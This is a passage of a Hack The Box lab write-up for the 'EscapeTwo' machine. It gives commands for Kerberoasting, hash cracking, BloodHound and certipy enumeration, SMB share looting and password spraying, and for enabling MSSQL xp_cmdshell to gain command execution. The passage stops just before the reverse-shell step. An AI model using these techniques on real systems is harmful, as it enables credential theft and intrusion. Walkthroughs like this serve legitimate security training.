+            <button class="copy-button" state="copy" data="update_var%20domain%20%22sequel.htb%22%0aupdate_var%20machine%20%22DC01%22">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>update_var domain <span style="color:#e6db74">&#34;sequel.htb&#34;</span>
+</span></span><span style="display:flex;"><span>update_var machine <span style="color:#e6db74">&#34;DC01&#34;</span></span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Updating</strong> <code>/etc/hosts</code> <strong>for DNS and LDAP Queries</strong>:</p>
+<ul>
+<li>I update my <code>/etc/hosts</code> file to enable tools like <a href="https://github.com/ropnop/kerbrute">kerbrute</a> for user enumeration and other tools that require DNS or LDAP for queries:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="sudo%20echo%20%22$box%20%20%20$domain%20$machine.$domain%20$machine%22%20%7c%20sudo%20tee%20-a%20/etc/hosts">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo echo <span style="color:#e6db74">&#34;</span>$box<span style="color:#e6db74">   </span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">.</span>$domain<span style="color:#e6db74"> </span>$machine<span style="color:#e6db74">&#34;</span> | sudo tee -a /etc/hosts</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="syncing-clocks-for-kerberos-exploitation">Syncing Clocks for Kerberos Exploitation:</h4>
+<ul>
+<li>
+<p>Since Kerberos is enabled on this host, it&rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="sudo%20ntpdate%20-s%20$domain">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo ntpdate -s $domain</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>+Note+: I am doing this now as we have the DNS name etc.</li>
+</ul>
+</li>
+</ul>
+<h3 id="dns-53">DNS <code>53</code>:</h3>
+<ul>
+<li>
+<p><strong>Using dnsenum to enumerate DNS entries</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="dnsenum%20-r%20--dnsserver%20$box%20--enum%20-p%200%20-s%200%20-f%20~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt%20$domain">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dnsenum -r --dnsserver $box --enum -p <span style="color:#ae81ff">0</span> -s <span style="color:#ae81ff">0</span> -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-110410_.png">
+</figure>
+</li>
+<li>Nothing out of the ordinary.</li>
+</ul>
+</li>
+</ul>
+<h3 id="kerberos-88">Kerberos <code>88</code>:</h3>
+<h4 id="using-netexec-or-impacket-for-asreproasting">Using netexec or impacket for ASReproasting:</h4>
+<ul>
+<li>
+<p><strong>We should always try and asreproast with a null/guest session as it can lead to an easy win</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="netexec%20ldap%20$box%20-u%20$user%20-p%20$pass%20--asreproast%20asrep.txt">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec ldap $box -u $user -p $pass --asreproast asrep.txt</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-081938_.png">
+</figure>
+</li>
+<li>Nothing found.</li>
+</ul>
+</li>
+</ul>
+<h4 id="using-netexec-for-kerberoasting">Using netexec for Kerberoasting:</h4>
+<ul>
+<li>
+<p><strong>As we have creds we can kerberoast</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="netexec%20ldap%20$box%20-u%20$user%20-p%20$pass%20--kerberoast%20kerb.txt">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec ldap $box -u $user -p $pass --kerberoast kerb.txt</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-082101_.png">
+</figure>
+</li>
+<li>Two service accounts, <code>ca_svc</code> &amp; <code>sql_svc</code> are kerberoastable. I am assuming that ca will be Certificate Authority.</li>
+</ul>
+</li>
+</ul>
+<h4 id="attempting-to-crack-kerberos-tickets">Attempting To Crack Kerberos Tickets:</h4>
+<ul>
+<li>I attempt to crack the kerberos tickets but they do not crack:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="hashcat%20-m%2013100%20kerb.txt%20~/Wordlists/rockyou.txt">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">13100</span> kerb.txt ~/Wordlists/rockyou.txt</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><figure><img src="/ox-hugo/2025-01-13-082617_.png">
+</figure>
+</li>
+<li>Lets move onto further enumeration.</li>
+</ul>
+<h3 id="performing-a-bloodhound-collection">Performing a Bloodhound Collection:</h3>
+<ul>
+<li>
+<p>I use bloodhound-python to perform a collection.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="bloodhound-python%20-d%20$domain%20-ns%20$box%20-c%20All%20-u%20$user%20-p%20$pass">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bloodhound-python -d $domain -ns $box -c All -u $user -p $pass</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>I then import these into bloodhound for investigation.</li>
+<li><figure><img src="/ox-hugo/2025-01-13-083332_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="bloodhound-findings">Bloodhound Findings:</h3>
+<ul>
+<li>
+<p>There is only 1 domain admin:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-084042_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Standard users have DC Sync Privileges:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-084133_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Our user has no overly permissive rights:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-084525_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Small domain with only 8 users:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-084440_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><code>sql_svc</code> looks to be a good target as it will most likely have access to the SQL server but is also a member of these groups:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-083806_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><code>ca_svc</code> is as suspected a member of the cert publishers group so can issue certs. We should look into using certipy-ad to enumerate the CA further.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-084003_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-the-ca-using-certipy-ad">Enumerating The CA Using Certipy-ad:</h3>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="certipy-ad%20find%20-vulnerable%20-u%20$user@$domain%20-p%20$pass%20-dc-ip%20$box">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box</span></span></code></pre></div>
+    
+</div>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20content-org/Walkthroughs/HTB/BlogEntriesMade/EscapeTwo%20%20%f0%9f%8d%a3%20main%20%203GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2008:34:09%20zsh%20%e2%9d%af%20certipy-ad%20find%20-vulnerable%20-u%20$user@$domain%20-p%20$pass%20-dc-ip%20$box%0aCertipy%20v4.8.2%20-%20by%20Oliver%20Lyak%20%28ly4k%29%0a%0a[*]%20Finding%20certificate%20templates%0a[*]%20Found%2034%20certificate%20templates%0a[*]%20Finding%20certificate%20authorities%0a[*]%20Found%201%20certificate%20authority%0a[*]%20Found%2012%20enabled%20certificate%20templates%0a[*]%20Trying%20to%20get%20CA%20configuration%20for%20%27sequel-DC01-CA%27%20via%20CSRA%0a[!]%20Got%20error%20while%20trying%20to%20get%20CA%20configuration%20for%20%27sequel-DC01-CA%27%20via%20CSRA:%20CASessionError:%20code:%200x80070005%20-%20E_ACCESSDENIED%20-%20General%20access%20denied%20error.%0a[*]%20Trying%20to%20get%20CA%20configuration%20for%20%27sequel-DC01-CA%27%20via%20RRP%0a[!]%20Failed%20to%20connect%20to%20remote%20registry.%20Service%20should%20be%20starting%20now.%20Trying%20again...%0a[*]%20Got%20CA%20configuration%20for%20%27sequel-DC01-CA%27%0a[*]%20Saved%20BloodHound%20data%20to%20%2720250113084633_Certipy.zip%27.%20Drag%20and%20drop%20the%20file%20into%20the%20BloodHound%20GUI%20from%20@ly4k%0a[*]%20Saved%20text%20output%20to%20%2720250113084633_Certipy.txt%27%0a[*]%20Saved%20JSON%20output%20to%20%2720250113084633_Certipy.json%27">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in content-org/Walkthroughs/HTB/BlogEntriesMade/EscapeTwo  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 08:34:09 zsh ❯ certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box
+</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">34</span> certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">12</span> enabled certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;sequel-DC01-CA&#39;</span> via CSRA
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Got error <span style="color:#66d9ef">while</span> trying to get CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;sequel-DC01-CA&#39;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;sequel-DC01-CA&#39;</span> via RRP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;sequel-DC01-CA&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saved BloodHound data to <span style="color:#e6db74">&#39;20250113084633_Certipy.zip&#39;</span>. Drag and drop the file into the BloodHound GUI from @ly4k
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saved text output to <span style="color:#e6db74">&#39;20250113084633_Certipy.txt&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saved JSON output to <span style="color:#e6db74">&#39;20250113084633_Certipy.json&#39;</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>I upload these to bloodhound but they do not work, so let&rsquo;s look at he <code>.json</code></li>
+<li><figure><img src="/ox-hugo/2025-01-13-110520_.png">
+</figure>
+</li>
+<li>Our current user does not have access to any vulnerable templates.</li>
+</ul>
+<h3 id="smb-445">SMB <code>445</code>:</h3>
+<h4 id="enumerating-smb-shares-using-netexec">Enumerating SMB shares using netexec:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="netexec%20smb%20$box%20-u%20$user%20-p%20$pass%20--shares">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass --shares</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-085238_.png">
+</figure>
+</li>
+<li>We have <code>READ</code> rights over the &ldquo;Accounting Department&rdquo; share</li>
+</ul>
+<h4 id="enumerating-the-accounting-department-share">Enumerating the Accounting Department Share:</h4>
+<p>I connect using smbclient:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="smbclient%20-U%20$domain%5c%5c$user%20%22%5c%5c%5c%5c$box%5c%5cAccounting%20Department%22">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smbclient -U $domain<span style="color:#ae81ff">\\</span>$user <span style="color:#e6db74">&#34;\\\\</span>$box<span style="color:#e6db74">\\Accounting Department&#34;</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<p>There are two spreadsheets in the share:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-085645_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I download them both:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-085730_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="reading-extracting-usernames-and-passwords-from-the-spreadsheets">Reading/Extracting Usernames &amp; Passwords From The Spreadsheets:</h4>
+<ul>
+<li>
+<p>I try and open the spreadsheets using Open Office, but they appear to be cipher text:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-102258_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Luckily <code>.xlsx</code> are just file archives that contain spreadsheets. You can read more about them on <a href="https://fileinfo.com/extension/xlsx">this page</a>, however the key part is this (bolding added by me)</p>
+<blockquote>
+<p>In Excel 2007, XLSX files replaced .XLS files as the standard file for saving spreadsheets in Excel. Unlike XLS files, which store spreadsheet data in a single binary file, <strong>XLSX files are saved in the Open XML format, which stores data as separate files and folders in a compressed Zip package.</strong> The archive includes the [Content_Types].xml file, which describes the spreadsheet, and an .XML file for each worksheet within the spreadsheet.</p>
+</blockquote>
+<ul>
+<li>This means we can manually extract the archive on our host to view the individual sheets contents.</li>
+</ul>
+</li>
+</ul>
+<h5 id="extracting-the-contents-of-the-xlsx-files-manually">Extracting the contents of the <code>xlsx</code> files manually:</h5>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="unzip%20accounting_2024.xlsx%0aunzip%20accounts.xlsx">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>unzip accounting_2024.xlsx
+</span></span><span style="display:flex;"><span>unzip accounts.xlsx</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>
+<figure><img src="/ox-hugo/2025-01-13-111754_.png">
+</figure>
+
+</li>
+<li>
+<figure><img src="/ox-hugo/2025-01-13-112024_.png">
+</figure>
+
+</li>
+<li>
+<p>Reading the file &ldquo;<code>SharedStrings.xml</code>&rdquo; from the <code>accounts.xlsx</code> extraction we can see clear text passwords and emails.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-112207_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="extracting-the-contents-of-the-xlsx-files-online">Extracting the contents of the <code>xlsx</code> files online:</h5>
+<ul>
+<li>
+<p><a href="https://jumpshare.com/viewer/xlsx">https://jumpshare.com/viewer/xlsx</a></p>
+</li>
+<li>
+<p><code>accounting_2024.xlsx</code> content:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-105951_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><code>accounts.xlsx</code> contains user credentials:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-110031_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="running-hashcat-again">Running Hashcat again:</h5>
+<ul>
+<li>I re-run hashcat with newly extracted passwords against the extracted Kerberos tickets but they do not crack.</li>
+</ul>
+<h4 id="testing-credentials">Testing Credentials:</h4>
+<ul>
+<li>
+<p>I test the newly found credentials and find that Oscars are also valid:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="netexec%20smb%20$box%20-u%20Users.txt%20-p%20Passwords.txt%20--continue-on-success%20%7c%20grep%20[&#43;]">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u Users.txt -p Passwords.txt --continue-on-success | grep <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-114200_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Checking Bloodhound I can see that Oscar is a member of the <code>Accounting Department</code> group.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-114902_.png">
+</figure>
+</li>
+<li>This group does not appear to have any interesting outbound object control however it&rsquo;s good to note he is part of this group for later on.
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-114959_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="enumerating-as-oscar">Enumerating As Oscar:</h3>
+<ul>
+<li>I check what shares we have access to as Oscar &amp; can see we have access to the <code>Users</code> share.</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="netexec%20smb%20$box%20-u%20$user%20-p%20$pass%20--shares">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec smb $box -u $user -p $pass --shares</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-114321_.png">
+</figure>
+</li>
+</ul>
+<h4 id="accessing-the-users-share-as-oscar">Accessing The Users Share As Oscar:</h4>
+<ul>
+<li>
+<p>I use smbclient to access the share.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="smbclient%20-U%20$domain%5c%5c$user%20%22%5c%5c%5c%5c$box%5c%5cUsers%22">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smbclient -U $domain<span style="color:#ae81ff">\\</span>$user <span style="color:#e6db74">&#34;\\\\</span>$box<span style="color:#e6db74">\\Users&#34;</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>I check the &ldquo;Default&rdquo; folder present and it appears to be a default user installation of windows:
+<ul>
+<li>Some initial enumeration does not yield any results</li>
+<li><figure><img src="/ox-hugo/2025-01-13-121018_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="mssql-1433">MSSQL <code>1433</code>:</h3>
+<h4 id="enumerating-the-mssql-service">Enumerating The MSSQL Service:</h4>
+<ul>
+<li>
+<p>I check if the retrieved SQL credentials work against the MSSQL service using netexec:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="netexec%20mssql%20$box%20-u%20$user%20-p%20$pass%20--local-auth">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec mssql $box -u $user -p $pass --local-auth</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-125005_.png">
+</figure>
+</li>
+<li>It works and we can connect.</li>
+</ul>
+</li>
+<li>
+<p>Even though our name is <code>sa</code> which would indicate it is a <code>sysadmin</code> I use the <code>mssql_priv</code> to check if they are and if not to elevate it.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="netexec%20mssql%20$box%20-u%20$user%20-p%20$pass%20--local-auth%20-M%20mssql_priv">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>netexec mssql $box -u $user -p $pass --local-auth -M mssql_priv</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-130203_.png">
+</figure>
+</li>
+<li>We are a sysadmin so let&rsquo;s connect and get a reverse shell.</li>
+</ul>
+</li>
+</ul>
+<h4 id="connecting-to-the-mssql-service">Connecting to the MSSQL Service:</h4>
+<ul>
+<li>
+<p>We can use impacket-mssqlclient to connect to the instance.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>impacket-mssqlclient $user@$box:$pass</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-13-130617_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>As we are a sysadmin we can enable <code>xp_cmdshell</code></p>
+</li>
+</ul>
+<h5 id="xp-cmdshell-primer"><code>xp_cmdshell</code> primer:</h5>
+<ul>
+<li>
+<p><strong>Core Functionality</strong>:</p>
+<ul>
+<li>Allows execution of Windows command shell (<code>cmd.exe</code>) commands directly from within SQL (+RCE+)</li>
+<li>Extended stored procedure that acts as a bridge between SQL Server and the operating system</li>
+<li>Returns command output as rows of text in the result set</li>
+<li>Limited to 8192 bytes for command strings</li>
+</ul>
+</li>
+<li>
+<p><strong>Configuration Settings</strong>:</p>
+<ul>
+<li>Disabled by default since SQL Server 2005</li>
+<li>Restricted to <code>sysadmin</code> role members only (which we are)</li>
+</ul>
+</li>
+</ul>
+<h4 id="enabling-xp-cmdshell-for-rce-on-the-host">Enabling <code>xp_cmdshell</code> For RCE On The Host:</h4>
+<ul>
+<li>
+<p>There are multiple ways we can enable <code>xp_cmdshell</code>, I will share two.</p>
+</li>
+<li>
+<p>Manual method, from an MSSQL shell we can enter the below commands.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="--%20Enable%20advanced%20options%0asp_configure%20%27show%20advanced%20options%27,%201;%0aRECONFIGURE;%0a%0a--%20Enable%20xp_cmdshell%0asp_configure%20%27xp_cmdshell%27,%201;%0aRECONFIGURE;">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- Enable advanced options
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>RECONFIGURE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Enable xp_cmdshell
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>, <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>RECONFIGURE;</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p>Automatic method using <code>impacket-mssqlclient</code> built in functionality:</p>
+<ul>
+<li>Luckily impacket has built in functionality to enable this.
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="--%20Enable%0aenable_xp_cmdshell%0aRECONFIGURE">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- Enable
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>enable_xp_cmdshell
+</span></span><span style="display:flex;"><span>RECONFIGURE</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><figure><img src="/ox-hugo/2025-01-13-134232_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="using-rce-via-xp-cmdshell-to-get-a-reverse-shell">Using RCE VIA <code>xp_cmdshell</code> To Get A Reverse Shell:</h3>
+<ul>
+<li>
+<p>I test a command &amp; it works as expected. We have RCE of the underlying host.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
